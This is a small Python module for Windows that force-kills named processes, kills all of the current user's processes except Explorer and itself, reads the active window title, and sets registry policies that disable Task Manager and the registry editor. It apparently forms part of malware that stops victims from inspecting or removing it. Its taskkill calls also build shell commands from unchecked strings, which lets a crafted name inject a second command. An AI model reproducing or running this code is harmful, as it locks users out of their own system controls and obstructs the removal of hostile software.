# Import modules

import win32gui
import subprocess


# Ends the selected process

def KillProcess(Process):
	if not Process.endswith('.exe'):
		Process = Process + '.exe'
	subprocess.call('taskkill /f /im ' + Process, shell=True)


# Gets the title of the active window

def WindowTitle():
	return win32gui.GetWindowText(win32gui.GetForegroundWindow())


# Stops all processes

def TaskkillAll(CurrentName):
	subprocess.call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
		shell=True)
	subprocess.call('explorer.exe',
		shell=True)


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager():
	subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
		shell=True)

def RegeditDisableRegistryTools():
	subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',
		shell=True)